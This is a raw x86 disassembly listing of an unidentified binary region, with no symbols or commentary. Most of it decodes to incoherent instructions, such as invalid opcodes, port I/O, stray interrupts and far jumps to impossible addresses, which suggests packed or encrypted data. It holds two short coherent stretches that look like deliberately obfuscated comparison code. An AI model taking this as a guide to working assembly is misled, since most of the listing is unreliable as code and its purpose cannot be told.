  410cf5:	sar    DWORD PTR [ebx-0x5a9cab7f],1
  410cfb:	out    dx,al
  410cfc:	cld    
  410cfd:	sub    DWORD PTR [ebx-0x57e2cf81],ebp
  410d03:	popa   
  410d04:	mov    edx,0x44c1f90b
  410d09:	sti    
  410d0a:	mul    DWORD PTR [esi-0x77]
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xfe12e09c
  410d25:	stc    
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d33
  410d2f:	adc    eax,0xa90553c7
  410d34:	pop    esp
  410d35:	xchg   esp,eax
  410d36:	outs   dx,BYTE PTR ds:[esi]
  410d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d38:	sbb    ebp,esp
  410d3a:	in     eax,0x90
  410d3c:	outs   dx,DWORD PTR ds:[esi]
  410d3d:	sbb    BYTE PTR [ebx+0x7774751],ah
  410d43:	stos   DWORD PTR es:[edi],eax
  410d44:	xor    eax,0x17ba79a5
  410d49:	outs   dx,BYTE PTR ds:[esi]
  410d4a:	mov    edx,0x3de86eb1
  410d4f:	mov    edx,0x62822ba5
  410d54:	pop    esp
  410d55:	pop    esp
  410d56:	xchg   ecx,eax
  410d57:	mov    al,ds:0xddca7e5b
  410d5c:	neg    DWORD PTR [edi-0x3ba7407e]
  410d62:	mov    ds:0xb592ec7b,al
  410d67:	ror    ecx,1
  410d69:	(bad)  
  410d6b:	mov    al,0xc5
  410d6d:	out    0x45,eax
  410d6f:	shl    edx,0xf8
  410d72:	mov    al,0x15
  410d74:	mov    cl,0xec
  410d76:	ja     0x410d8c
  410d78:	stc    
  410d79:	mov    ah,BYTE PTR [edi-0x33]
  410d7c:	ficom  WORD PTR ds:0x24d6e74a
  410d82:	shl    bl,0xa3
  410d85:	mov    dh,0x5a
  410d87:	lds    edx,FWORD PTR [ebp+0x64]
  410d8a:	je     0x410d60
  410d8c:	retf   0xc1a1
  410d8f:	dec    esp
  410d90:	into   
  410d91:	mov    edi,0xc771ab88
  410d96:	dec    ecx
  410d97:	adc    eax,0xa88e090e
  410d9c:	add    ch,BYTE PTR [ecx-0x5a]
  410d9f:	inc    ebp
  410da0:	ret    0xb165
  410da3:	xchg   esi,eax
  410da4:	dec    eax
  410da5:	push   esp
  410da6:	cmp    dh,al
  410da8:	ss cmp al,0xda
  410dab:	xor    eax,0x635118f7
  410db0:	mov    bh,BYTE PTR [esi+0x30]
  410db3:	clc    
  410db4:	cmp    BYTE PTR [ebx+0x3f],al
  410db7:	sub    ah,BYTE PTR [edx+0x9]
  410dba:	sbb    al,ah
  410dbc:	xchg   ebp,eax
  410dbd:	or     DWORD PTR [edi],edx
  410dbf:	int    0xc
  410dc1:	push   ecx
  410dc2:	cmp    al,BYTE PTR [edi-0x2c]
  410dc5:	pop    esp
  410dc6:	jmp    0xfcb1:0x2cf61888
  410dcd:	push   edi
  410dce:	popf   
  410dcf:	repz cmp eax,0x56a27e4d
  410dd5:	push   edx
  410dd6:	push   esp
  410dd7:	retf   0xa752
  410dda:	push   ds
  410ddb:	mov    esi,?
  410ddd:	bswap  ebp
  410ddf:	out    0x47,eax
  410de1:	mov    bl,bl
  410de3:	mov    eax,ds:0xcaa12192
  410de8:	or     eax,0x77bafeab
  410ded:	sbb    ebp,DWORD PTR fs:[ebp-0x2ca2e3ba]
  410df4:	inc    esi
  410df5:	imul   eax,esi,0xffffff8f
  410df8:	cmp    dh,bl
  410dfa:	add    eax,0x142734fe
  410dff:	sub    edx,DWORD PTR [esi]
  410e01:	scas   al,BYTE PTR es:[edi]
  410e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e03:	jno    0x410e7a
  410e05:	pop    ecx
  410e06:	div    DWORD PTR [esi]
  410e08:	dec    edx
  410e09:	icebp  
  410e0a:	inc    eax
  410e0c:	ss mov ebx,0x166a81c2
  410e12:	aad    0x66
  410e14:	pusha  
  410e15:	sti    
  410e16:	xor    bh,BYTE PTR [ebp-0x7e098313]
  410e1c:	add    eax,0x2cd1606
  410e21:	es jle 0x410e79
  410e24:	xchg   ecx,eax
  410e25:	add    DWORD PTR [edi],ebx
  410e27:	push   edi
  410e28:	dec    ecx
  410e29:	int    0xb7
  410e2b:	cmp    al,0xe6
  410e2d:	int    0xdb
  410e2f:	and    DWORD PTR [edx-0x49067367],esi
  410e35:	mov    dl,0x73
  410e37:	sub    DWORD PTR [ecx-0xa],ebx
  410e3a:	push   ebp
  410e3b:	dec    esp
  410e3c:	leave  
  410e3d:	sub    eax,DWORD PTR [edi+0x74]
  410e40:	add    cl,ch
  410e42:	mov    ds:0x335942ba,eax
  410e47:	lods   al,BYTE PTR ds:[esi]
  410e48:	inc    edx
  410e49:	jbe    0x410e76
  410e4b:	jne    0x410e9a
  410e4d:	(bad)  
  410e4e:	stc    
  410e4f:	jne    0x410e18
  410e51:	mov    esi,0x187a3e82
  410e56:	cmp    al,0xd7
  410e58:	loope  0x410dfe
  410e5a:	dec    ebx
  410e5b:	repz sar ch,1
  410e5e:	in     al,0x41
  410e60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e61:	sahf   
  410e62:	push   ebp
  410e63:	mov    ?,WORD PTR [edi]
  410e65:	mov    ds:0x24199b28,eax
  410e6a:	cmp    BYTE PTR ds:0xa23668bd,0x56
  410e71:	stos   DWORD PTR es:[edi],eax
  410e72:	sbb    eax,0xfb5cce9a
  410e77:	test   DWORD PTR [edx+0x4c],eax
  410e7a:	mov    ah,0xfd
  410e7c:	sub    al,0x8d
  410e7e:	gs jge 0x410e9b
  410e81:	not    BYTE PTR [esi+0x433e0bb4]
  410e87:	dec    ebx
  410e88:	push   edi
  410e89:	xchg   BYTE PTR [ebp-0x18],cl
  410e8c:	mov    al,ds:0x33309022
  410e91:	and    BYTE PTR [edi],ch
  410e93:	and    al,0xe7
  410e95:	push   ss
  410e96:	jp     0x410e45
  410e98:	inc    eax
  410e99:	retf   
  410e9a:	push   eax
  410e9b:	or     DWORD PTR [ebx-0x3671d677],edx
  410ea1:	pop    edi
  410ea2:	inc    ecx
  410ea3:	icebp  
  410ea4:	int3   
  410ea5:	cmp    bh,BYTE PTR [ecx]
  410ea7:	nop    DWORD PTR [esi-0xd]
  410eab:	pop    esi
  410eac:	outs   dx,DWORD PTR ds:[esi]
  410ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eaf:	inc    esi
  410eb0:	pop    esp
  410eb1:	push   0xabe23edb
  410eb6:	jecxz  0x410ef5
  410eb8:	mov    al,ds:0x39060bf
  410ebd:	(bad)  
  410ebe:	aas    
  410ebf:	lods   al,BYTE PTR ds:[esi]
  410ec0:	es aaa 
  410ec2:	test   cl,ch
  410ec4:	rcl    DWORD PTR [edx-0x53283ff4],1
  410eca:	stc    
  410ecb:	js     0x410ee3
  410ecd:	sub    al,BYTE PTR [ebp+eax*8+0x64]
  410ed1:	xor    BYTE PTR [edi+0x1516b586],ah
  410ed7:	stos   BYTE PTR es:[edi],al
  410ed8:	add    ah,bl
  410eda:	xor    DWORD PTR [edi*1+0x20a8d5d9],esi
  410ee1:	add    dl,dl
  410ee3:	xchg   ebx,eax
  410ee4:	add    esp,ebp
  410ee6:	stos   BYTE PTR es:[edi],al
  410ee7:	jo     0x410ea6
  410ee9:	fsubr  DWORD PTR [eax-0x25]
  410eec:	test   eax,0xa9bca594
  410ef1:	jo     0x410e79
  410ef3:	pushf  
  410ef4:	pop    DWORD PTR [esp+edi*8-0x7f]
  410ef8:	ja     0x410ee6
  410efa:	pop    esi
  410efb:	mov    bl,0x7e
  410efd:	cmc    
  410efe:	fld    TBYTE PTR gs:[ebp-0xe]
  410f02:	adc    al,0x2b
  410f04:	add    ebx,esp
  410f06:	add    edx,DWORD PTR [eax+0x474242c0]
  410f0c:	mov    dh,0x6a
  410f0e:	imul   ecx,DWORD PTR ds:0x145582d3,0xffffff97
  410f15:	(bad)  
  410f17:	mov    esi,0xba4a04f2
  410f1c:	add    ch,BYTE PTR [ebx-0x52]
  410f1f:	nop
  410f20:	aam    0xe9
  410f22:	popf   
  410f23:	in     eax,0xe6
  410f25:	jg     0x410eb4
  410f27:	jp     0x410f28
  410f29:	xlat   BYTE PTR ds:[ebx]
  410f2a:	cdq    
  410f2b:	add    al,0x59
  410f2d:	inc    ebp
  410f2e:	mov    ds:0xbc3096c2,eax
  410f33:	ret    0xa98e
  410f36:	xchg   ah,al
  410f38:	dec    ebp
  410f39:	push   eax
  410f3a:	fmulp  st(6),st
  410f3c:	push   edi
  410f3d:	out    0xa7,eax
  410f3f:	(bad)  
  410f40:	gs cli 
  410f42:	jae    0x410f69
  410f44:	mov    esp,0x4870e742
  410f49:	mov    ecx,0xbca75f76
  410f4e:	push   0xffffffe0
  410f50:	stos   DWORD PTR es:[edi],eax
  410f51:	sbb    eax,0x173a3ea
  410f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f57:	cmp    DWORD PTR [ebx+0x7494e76e],eax
  410f5d:	pop    esp
  410f5e:	sub    al,0x98
  410f60:	pop    esi
  410f61:	push   ecx
  410f62:	xchg   esi,eax
  410f63:	or     eax,0x5124fc58
  410f68:	cmp    BYTE PTR [edi+0x56],0x8
  410f6c:	fld    QWORD PTR [edx]
  410f6e:	add    esi,edx
  410f70:	inc    ebp
  410f71:	in     eax,dx
  410f72:	ficomp DWORD PTR [esi+0x72d3395b]
  410f78:	adc    dh,BYTE PTR [eax-0x456e15b4]
  410f7e:	inc    ebx
  410f7f:	popa   
  410f80:	jle    0x410fa4
  410f82:	rcl    DWORD PTR [esi],1
  410f84:	jmp    0x410f87
  410f86:	repz jg 0x410ffd
  410f89:	or     ch,BYTE PTR [ebp+ebx*1+0xd630207]
  410f90:	test   eax,0x94aa2d28
  410f95:	push   ss
  410f96:	in     al,dx
  410f97:	std    
  410f98:	cmp    DWORD PTR [ecx-0x30],edi
  410f9b:	clc    
  410f9c:	sub    eax,0x7533814f
  410fa1:	xor    al,0x18
  410fa3:	nop
  410fa4:	aam    0x7d
  410fa6:	pop    ds
  410fa7:	fadd   DWORD PTR [esi-0x73]
  410faa:	(bad)  [edx+0x27]
  410fad:	mov    ds:0xdd3a3b7c,eax
  410fb2:	das    
  410fb3:	xchg   BYTE PTR [ebx-0x16],dh
  410fb6:	cmp    BYTE PTR [edx+0x38dac9f3],0xbc
  410fbd:	dec    edi
  410fbe:	mov    dl,0xa8
  410fc0:	xor    eax,0xdd11106f
  410fc5:	dec    ebp
  410fc6:	cmp    bl,BYTE PTR [esi+0x3cf40bc9]
  410fcc:	xlat   BYTE PTR ds:[ebx]
  410fcd:	sub    bl,BYTE PTR [edx+0x53773212]
  410fd3:	xchg   edx,eax
  410fd4:	add    al,0x4
  410fd6:	inc    edi
  410fd7:	int    0x60
  410fd9:	pop    es
  410fda:	retf   
  410fdb:	pop    esp
  410fdc:	pop    ebx
  410fdd:	cwde   
  410fde:	dec    ebx
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fde
  41102b:	dec    ebx
  41102c:	dec    ebx
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x411091
  411037:	dec    edx
  411038:	fcomp  QWORD PTR [edi]
  41103a:	(bad)  
  41103b:	aas    
  41103c:	and    DWORD PTR ds:0x74942c61,ebx
  411042:	mov    ecx,cs
  411044:	mov    WORD PTR [edi],ds
  411046:	and    eax,DWORD PTR [ecx+0x4f6a0776]
  41104c:	jmp    0x411073
  41104e:	and    edi,DWORD PTR [eax-0x609ce4ee]
  411054:	mov    edi,0x37932123
  411059:	xchg   DWORD PTR [ecx],esi
  41105b:	rol    BYTE PTR [ebx+0x7b],1
  41105e:	out    0xa9,al
  411060:	pop    es
  411061:	xor    al,0x93
  411063:	cmp    eax,0x69541997
  411068:	fdiv   QWORD PTR [ebp-0x1993a992]
  41106e:	or     eax,0x8473cdfc
  411073:	push   ss
  411074:	inc    ecx
  411075:	xchg   esi,eax
  411076:	pop    es
  411077:	sahf   
  411078:	xchg   ebp,eax
  411079:	xchg   ebp,eax
  41107a:	popa   
  41107b:	das    
  41107c:	push   edx
  41107d:	xchg   DWORD PTR [ebp+0x76488cac],eax
  411083:	loopne 0x4110b4
  411085:	sub    eax,0xd8bcb8c0
  41108a:	cli    
  41108b:	push   ebx
  41108c:	das    
  41108d:	aas    
  41108e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41108f:	sbb    DWORD PTR [ebx+eax*1],esp
  411092:	lods   eax,DWORD PTR ds:[esi]
  411093:	ja     0x41105f
  411095:	adc    DWORD PTR ds:0xea6b81f6,ebp
  41109b:	ja     0x4110fe
  41109d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41109e:	fnstcw WORD PTR [ecx]
  4110a0:	and    bh,BYTE PTR [eax]
  4110a2:	into   
  4110a3:	cmp    DWORD PTR ss:[edx],0x7438e8f4
  4110aa:	cmp    eax,0x1f7e7452
  4110af:	out    0x29,eax
  4110b1:	push   edx
  4110b2:	nop
  4110b3:	pop    ds
  4110b4:	mov    cl,BYTE PTR es:[esp+eax*4-0x19013c1b]
  4110bc:	mov    fs,WORD PTR [ecx*4-0x5958f3d1]
  4110c3:	div    BYTE PTR [eax]
  4110c5:	xchg   esi,eax
  4110c6:	xor    DWORD PTR [ebx],ecx
  4110c8:	jb     0x411138
  4110ca:	adc    esi,DWORD PTR [eax+0x716cd748]
  4110d0:	mov    ecx,0x264c4180
  4110d5:	jno    0x4110ff
  4110d7:	je     0x411061
  4110d9:	xchg   edi,eax
  4110da:	mov    dl,0xee
  4110dc:	fmul   st,st(7)
  4110de:	jecxz  0x411133
  4110e0:	add    bl,ch
  4110e2:	out    0x9c,eax
  4110e4:	div    BYTE PTR [edi]
  4110e6:	cwde   
  4110e7:	ret    
  4110e8:	dec    eax
  4110e9:	cld    
  4110ea:	out    dx,eax
  4110eb:	sub    cl,bl
  4110ed:	fld    DWORD PTR [eax]
  4110ef:	mov    ds:0x6cb487dd,al
  4110f4:	pop    ss
  4110f5:	das    
  4110f6:	ror    DWORD PTR [ebx],1
  4110f8:	fs mov edx,eax
  4110fb:	iret   
  4110fc:	or     BYTE PTR [ebx],0x29
  4110ff:	arpl   si,di
  411101:	jns    0x41111d
  411103:	jno    0x4110cf
  411105:	test   BYTE PTR [ebp+0x74b71da0],cl
  41110b:	pop    esp
  41110c:	aam    0x4b
  41110e:	cmc    
  41110f:	inc    ecx
  411110:	mov    ah,0xeb
  411112:	push   esp
  411113:	bts    DWORD PTR [ecx-0x543bab47],eax
  41111a:	xchg   esi,eax
  41111b:	mov    BYTE PTR [edx-0xd],dh
  41111e:	add    eax,0xe8099ed9
  411123:	add    BYTE PTR [ecx+edx*4-0x8236805],al
  41112a:	cmp    BYTE PTR [ecx-0x52],bl
  41112d:	in     eax,0xa0
  41112f:	dec    edi
  411130:	ja     0x411160
  411132:	mov    ch,0xd3
  411134:	add    BYTE PTR [ebx],ah
  411136:	imul   eax,DWORD PTR [edx],0x248b19e4
  41113c:	pop    esp
  41113d:	mov    ds:0x7c4b5937,al
  411142:	push   ds
  411143:	or     ecx,DWORD PTR [edi+0x5116f993]
  411149:	in     eax,dx
  41114a:	(bad)  
  41114c:	xchg   esi,ebx
  41114e:	jo     0x4110f6
  411150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411151:	data16 (bad) 
  411153:	push   edi
  411154:	ret    
  411155:	dec    eax
  411156:	fs pop esp
  411158:	ficom  WORD PTR [ebx-0x36f44ca5]
  41115e:	in     eax,dx
  41115f:	sub    eax,DWORD PTR [edi-0x62cce9a2]
  411165:	ja     0x41117b
  411167:	call   DWORD PTR [ebp-0x26]
  41116a:	ja     0x411113
  41116c:	ja     0x4111c5
  41116e:	mov    ebx,0x78ebf925
  411173:	cs push cs
  411175:	fcom   DWORD PTR [ebx+ecx*1+0x3e9a3f4e]
  41117c:	pop    ds
  41117d:	enter  0x15ec,0x6b
  411181:	adc    bl,BYTE PTR [eax]
  411183:	fwait
  411184:	inc    ecx
  411185:	xchg   edi,eax
  411186:	aam    0xd1
  411188:	ror    esi,0xaa
  41118b:	mov    BYTE PTR [ecx],cl
  41118d:	int3   
  41118e:	mov    WORD PTR [ecx+0x41],ds
  411191:	mov    edi,0x4b8762c4
  411196:	mov    ecx,0x77fa3635
  41119b:	xchg   edi,eax
  41119c:	sub    BYTE PTR [ebx+edi*1+0x10507877],bh
  4111a3:	push   ebp
  4111a4:	iret   
  4111a5:	push   eax
  4111a6:	cdq    
  4111a7:	inc    edx
  4111a8:	jg     0x4111b3
  4111aa:	int    0xd
  4111ac:	push   esp
  4111ad:	adc    DWORD PTR [esi+0x3a35aee7],0xffffff9c
  4111b4:	int    0xf0
  4111b6:	int    0xe1
  4111b8:	xlat   BYTE PTR ds:[ebx]
  4111b9:	dec    edi
  4111ba:	lock rcl BYTE PTR [ebx],0x83
  4111be:	int3   
  4111bf:	aas    
  4111c0:	push   edi
  4111c1:	xchg   ebx,eax
  4111c2:	adc    eax,0x388a2e09
  4111c7:	dec    BYTE PTR [ecx]
  4111c9:	out    dx,eax
  4111ca:	fstp   st(0)
  4111cc:	call   0x1aac:0xbd2ee446
  4111d3:	jmp    0xf9e3:0x84be9f76
  4111da:	sub    esi,ebp
  4111dc:	inc    eax
  4111dd:	cdq    
  4111de:	jbe    0x4111cb
  4111e0:	mov    dh,0x94
  4111e2:	push   edx
  4111e3:	inc    esi
  4111e4:	inc    edx
  4111e5:	push   eax
  4111e6:	fld    QWORD PTR [ebp+0x6273cfad]
  4111ec:	sar    BYTE PTR [eax+0xd55cfd9],0x34
  4111f3:	dec    ebx
  4111f4:	cmp    BYTE PTR [ebp-0x6a28f5d3],cl
  4111fa:	xchg   ebp,eax
  4111fb:	pop    ecx
  4111fc:	xor    ah,dl
  4111fe:	popa   
  4111ff:	and    al,0xb2
  411201:	aam    0xe1
  411203:	and    eax,0x54ee6f50
  411208:	and    eax,DWORD PTR [edx+0x42]
  41120b:	pop    ebx
  41120c:	aas    
  41120d:	out    dx,al
  41120e:	dec    esi
  41120f:	mov    bl,BYTE PTR [ecx+0x2e562f24]
  411215:	push   edx
  411216:	aaa    
  411217:	lahf   
  411218:	ins    DWORD PTR es:[edi],dx
  411219:	ficomp WORD PTR [edx-0x21]
  41121c:	mov    ebp,0x83238f36
  411221:	sub    edi,DWORD PTR [eax-0x47]
  411224:	shl    BYTE PTR [si+0x1a],0xce
  411229:	mov    ds:0xd0814f36,eax
  41122e:	dec    ecx
  41122f:	stos   BYTE PTR es:[edi],al
  411230:	pop    ebp
  411231:	push   esp
  411232:	inc    edi
  411233:	mov    al,ds:0xdf0e17a6
  411238:	adc    dh,dh
  41123a:	inc    edi
  41123b:	cmc    
  41123c:	cmp    BYTE PTR [ebp-0x1449fb47],dl
  411242:	retf   
  411243:	add    ebp,ebp
  411245:	dec    ecx
  411246:	mov    bh,0x69
  411248:	cmp    al,0xe0
  41124a:	test   al,0x82
  41124c:	mov    esi,0x936addc0
  411251:	and    ebp,eax
  411253:	jns    0x411267
  411255:	jmp    0x4112d0
  411257:	dec    esi
  411258:	cmp    ebx,eax
  41125a:	repnz inc ecx
  41125c:	jmp    0xde4f37bb
  411261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411262:	ins    BYTE PTR es:[edi],dx
  411263:	push   esi
  411264:	daa    
  411265:	es call ecx
  411268:	mov    BYTE PTR [ebp+0x5c],cl
  41126b:	fidivr DWORD PTR [edi]
  41126d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41126e:	sub    eax,0x47856121
  411273:	dec    ebp
  411274:	cmp    eax,DWORD PTR [eax+0x3fd44577]
  41127a:	add    DWORD PTR [ecx-0x419fba6d],esi
  411280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411281:	mov    al,0x1d
  411283:	dec    edx
  411284:	push   esi
  411285:	lods   eax,DWORD PTR ds:[esi]
  411286:	mov    bl,0x7d
  411288:	cmp    eax,0xf3aab6e9
  41128d:	push   esi
  41128e:	int    0xb2
  411290:	stos   DWORD PTR es:[edi],eax
  411291:	rol    DWORD PTR [ebp+0x7da86f47],1
  411297:	icebp  
  411298:	inc    ecx
  411299:	add    DWORD PTR [esi],esi
  41129b:	push   ebp
  41129c:	jae    0x41123e
  41129e:	mov    eax,ds:0x1e426b10
  4112a3:	and    DWORD PTR [ebx-0x3c172163],edi
  4112a9:	mov    WORD PTR [ebp-0x20c72e3f],es
  4112af:	jg     0x41124c
  4112b1:	push   ebx
  4112b2:	pop    esp
  4112b3:	std    
  4112b4:	lea    ebx,[esi-0x6a]
  4112b7:	pop    ecx
  4112b8:	aas    
  4112b9:	xchg   esp,eax
  4112ba:	pushf  
  4112bb:	imul   esi,DWORD PTR [ebx],0xffffff9c
  4112be:	jb     0x4112de
  4112c0:	les    edi,FWORD PTR [edx-0x3d]
  4112c3:	xchg   DWORD PTR [ebp+0x14781f1b],eax
  4112c9:	dec    ecx
  4112ca:	mov    ah,0x9d
  4112cc:	fsub   DWORD PTR [edx-0x3e]
  4112cf:	mov    ch,0x17
  4112d1:	mov    dl,0x51
  4112d3:	jmp    0xe1b0253b
  4112d8:	dec    edi
  4112d9:	jmp    0x4112ae
  4112db:	and    ecx,eax
  4112dd:	cwde   
  4112de:	lahf   
  4112df:	(bad)  
  4112e0:	push   ss
  4112e1:	sahf   
  4112e2:	push   edx
  4112e3:	inc    ebp
  4112e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112e5:	aam    0x21
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x9668f61e,eax
  411318:	cli    
  411319:	sbb    al,0x1c
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411362
  411324:	or     DWORD PTR [ebp+0x63c52bbf],0x65
  41132b:	and    eax,0xa1fabe62
  411330:	scas   eax,DWORD PTR es:[edi]
  411331:	sbb    dl,BYTE PTR ds:0xeb6c48d9
  411337:	cmp    eax,0x6f06a270
  41133c:	bound  edx,QWORD PTR [esi-0x2b]
  41133f:	clc    
  411340:	mov    edx,fs
  411342:	enter  0x2043,0xbf
  411346:	inc    esi
  411347:	test   BYTE PTR [ebx],0xda
  41134a:	push   es
  41134b:	stc    
  41134c:	scas   al,BYTE PTR es:[edi]
  41134d:	cli    
  41134e:	shl    DWORD PTR [ebp+0x59e70140],0x34
  411355:	aam    0xf2
  411357:	inc    ebx
  411358:	stos   DWORD PTR es:[edi],eax
  411359:	adc    BYTE PTR [ebx+0x66ee09e],ah
  41135f:	or     edi,ebp
  411361:	in     al,0x71
  411363:	ss pop ebp
  411365:	jmp    0x954654c8
  41136a:	call   0x760f52ef
  41136f:	jle    0x411370
  411371:	xor    dl,BYTE PTR [edi+0x4832feb0]
  411377:	xor    eax,0xf301d50d
  41137c:	cli    
  41137d:	mov    DWORD PTR [ebx],ecx
  41137f:	mov    es,WORD PTR [si]
  411382:	push   esi
  411383:	push   es
  411384:	jns    0x411399
  411386:	(bad)  
  411387:	cdq    
  411388:	mov    DWORD PTR [eax+0xc],ebx
  41138b:	inc    esi
  41138c:	mov    cl,0x4c
  41138e:	pop    ebx
  41138f:	dec    eax
  411390:	sub    DWORD PTR [edi+eax*2],ebp
  411393:	jmp    0x1e27:0x9317d174
  41139a:	xor    ebp,DWORD PTR [ebx]
  41139c:	call   0x828251b9
  4113a1:	stos   DWORD PTR es:[edi],eax
  4113a2:	in     eax,dx
  4113a3:	mov    al,ds:0xce6bd97
  4113a8:	int3   
  4113a9:	xor    BYTE PTR [ebx+0x528d53fe],bl
  4113af:	in     al,dx
  4113b0:	pop    ecx
  4113b1:	(bad)  
  4113b2:	ds xor eax,0x2dd5db11
  4113b8:	das    
  4113b9:	mov    ebx,0x8ace2099
  4113be:	push   ecx
  4113bf:	push   ss
  4113c0:	dec    ebp
  4113c1:	sub    eax,0x5af59e82
  4113c6:	fmul   QWORD PTR [esp+ebp*2-0x63]
  4113ca:	inc    esi
  4113cb:	pop    ss
  4113cc:	xchg   DWORD PTR [ecx],ebp
  4113ce:	dec    esp
  4113cf:	fucomp st(6)
  4113d1:	jns    0x411383
  4113d3:	push   ecx
  4113d4:	in     eax,dx
  4113d5:	rcl    esp,0xb8
  4113d8:	mov    ebx,DWORD PTR ds:0x8063cff0
  4113de:	aad    0x64
  4113e0:	mov    eax,ds:0x71cec44d
  4113e5:	and    ebp,DWORD PTR [ecx]
  4113e7:	int3   
  4113e8:	fs sub al,0xf8
  4113eb:	mov    bh,0xb6
  4113ed:	or     ah,BYTE PTR [ecx]
  4113ef:	in     eax,0x62
  4113f1:	fwait
  4113f2:	xor    cl,BYTE PTR [edx]
  4113f4:	cwde   
  4113f5:	stos   DWORD PTR es:[edi],eax
  4113f6:	repnz pop edx
  4113f8:	test   eax,0x436c0f69
  4113fd:	repz mov ah,0x5
  411400:	push   eax
  411401:	pop    ebx
  411402:	mov    bh,0x9
  411404:	jmp    0x9645:0xadf2a663
  41140b:	mov    eax,ds:0xfb1da52d
  411410:	adc    al,0x10
  411412:	sbb    DWORD PTR [edx-0x5b778065],0xffffff8c
  411419:	enter  0xe89c,0x83
  41141d:	mov    eax,ds:0x65470f9a
  411422:	dec    esi
  411423:	sbb    ebx,edi
  411425:	leave  
  411426:	dec    edi
  411427:	dec    edi
  411428:	or     bh,al
  41142a:	add    edx,edx
  41142c:	or     al,bh
  41142e:	cmc    
  41142f:	les    ecx,FWORD PTR ds:0x5bba1227
  411435:	adc    al,0xa3
  411437:	scas   al,BYTE PTR es:[edi]
  411438:	cli    
  411439:	xor    BYTE PTR [ebp+0x403a0b4],bh
  41143f:	push   esi
  411440:	pop    ebp
  411441:	retf   
  411442:	fadd   QWORD PTR [edi-0x4a]
  411445:	sub    ebx,DWORD PTR [ebp+0x5e03f505]
  41144b:	push   ecx
  41144c:	lds    eax,FWORD PTR [ecx-0x50]
  41144f:	jbe    0x411447
  411451:	bound  ecx,QWORD PTR [esi-0x23]
  411454:	ins    BYTE PTR es:[edi],dx
  411455:	jmp    0x80ac:0xb50e4097
  41145c:	aam    0xf5
  41145e:	push   0xffffffe4
  411460:	jno    0x411422
  411462:	mov    ds:0xf3665980,eax
  411467:	mov    bh,0xba
  411469:	mov    edx,0x3994250a
  41146e:	jne    0x411453
  411470:	push   edi
  411471:	out    dx,al
  411472:	call   0x1e2:0x17d62177
  411479:	fdiv   st,st(6)
  41147b:	pop    esi
  41147c:	mov    edi,0x92baba5
  411481:	out    0xa0,al
  411483:	push   ss
  411484:	xchg   ebp,eax
  411485:	mov    ah,0x5a
  411487:	in     al,dx
  411488:	inc    edx
  411489:	or     al,0x4f
  41148b:	mov    ch,0xab
  41148d:	sub    edi,DWORD PTR [edi-0x55]
  411490:	fwait
  411491:	and    ebx,esp
  411493:	sub    BYTE PTR [edx+0x5],bl
  411496:	push   ebp
  411497:	inc    ecx
  411498:	jbe    0x41149a
  41149a:	sbb    edi,DWORD PTR [esi]
  41149c:	xchg   edx,eax
  41149d:	or     edi,DWORD PTR [ebp-0x4b7ac643]
  4114a3:	mul    BYTE PTR [esp+ebp*4+0x700cfad2]
  4114aa:	push   0x8bca5653
  4114af:	das    
  4114b0:	aad    0x8b
  4114b2:	call   0x1423:0x810df453
  4114b9:	xchg   edx,eax
  4114ba:	pop    es
  4114bb:	retf   
  4114bc:	outs   dx,DWORD PTR ds:[esi]
  4114bd:	mov    ebp,0xef146a3
  4114c2:	dec    edx
  4114c3:	sub    ebp,eax
